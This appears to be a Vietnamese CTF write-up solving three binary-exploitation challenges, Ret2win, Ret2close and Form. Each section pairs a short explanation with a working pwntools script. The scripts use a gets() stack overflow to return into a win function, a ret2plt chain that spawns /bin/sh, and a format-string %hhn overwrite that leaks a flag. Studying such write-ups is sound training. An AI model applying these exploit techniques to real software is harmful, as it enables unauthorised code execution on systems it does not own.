## PWN
### Ret2win
Bài này đề cho ta file binary và file source
```clike=
#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[64];
  gets(buf);
}

int win() {
  system("cat flag.txt");
}
```

![](https://hackmd.io/_uploads/HJ4LQEbs3.png)

Vậy bài này bof cơ bản.
```python=
from pwn import *
exe = ELF("chal")
#p = process(exe.path)
p = remote("ret2win.chal.imaginaryctf.org",1337)
p.sendline(b'a'*72+p64(0x000000000040101a)+p64(exe.sym['win']))
p.interactive()
```
#### `flag:ictf{r3turn_0f_th3_k1ng?}`
### Ret2close
Bài này cũng cho file binary và file source y chang bài trước.
Lần này đề nói thêm là phải lấy shell. Ở đây khi debug ta nhận thấy rdi tức arguments 1 trỏ vào địa chỉ có thể read-write trước khi `ret` -> gọi PTL `gets` -> nhập `/bin/sh` -> gọi PLT `system`

![](https://hackmd.io/_uploads/S1WBENZj2.png)


Khi chạy code thì ta thấy rằng thay vì thực hiện `/bin/sh` mà thực hiện `/bin.sh`

![](https://hackmd.io/_uploads/HJMa3i353.png)

Ta để ý rằng `ord(.) < ord (/)` 1 đơn vị. Vậy thì ta thử gửi `ord(0)` vì `ord(0)-1 = ord(/)`
Đổi lại thì ta có được flag.

```python=
from pwn import *
exe = ELF("chal")
p = process(exe.path)
#p = remote("ret2win.chal.imaginaryctf.org",1337)

'''
gdb.attach(p,
"""
b*main + 34
""")
input()
'''
gets = 0x401060
ret = 0x000000000040101a
p.sendline(b'a'*64+p64(exe.bss()+0x20)+p64(ret)+p64(gets)+p64(ret)+p64(0x401050))
p.sendline(b'/bin0sh\x00')
p.interactive()

```
#### `flag:ictf{ret2libc?_what_libc?}`
### Form
Bài này cho ta 1 file binary

![](https://hackmd.io/_uploads/ByUN0in9h.png)

Dễ dàng nhận thấy có lỗi format string ở hàm `printf(format)`

![](https://hackmd.io/_uploads/SklaAj3q3.png)

Ta thấy rằng trước khi gọi `printf` thì trên stack có địa chỉ heap lưu `format` chỉ khác địa chỉ lưu flag 1 byte cuối.

![](https://hackmd.io/_uploads/r1qCRin52.png)

Do đó ta overwrite bằng `%n`. Nhưng ở đây có lưu ý là gọi từng %c thay vì gọi `%6$c` vì nó sẽ update stack trong từng lần gọi `%c` thay vì gọi giá trị cũ như `%6$c`

```python=
from pwn import *
exe = ELF("chal")
p = process(exe.path)
#p = remote("form.chal.imaginaryctf.org",1337)
gdb.attach(p,
"""
b*main+207
c
""")
input()
payload = b"%155c" +b"%c"*5+ b"%hhn" +b'%6$s' #+ b'%p'*6 + b'%6$p'
p.sendline(payload)

p.interactive()
```
#### `flag:ictf{ngl_kinda_bored_of_these}`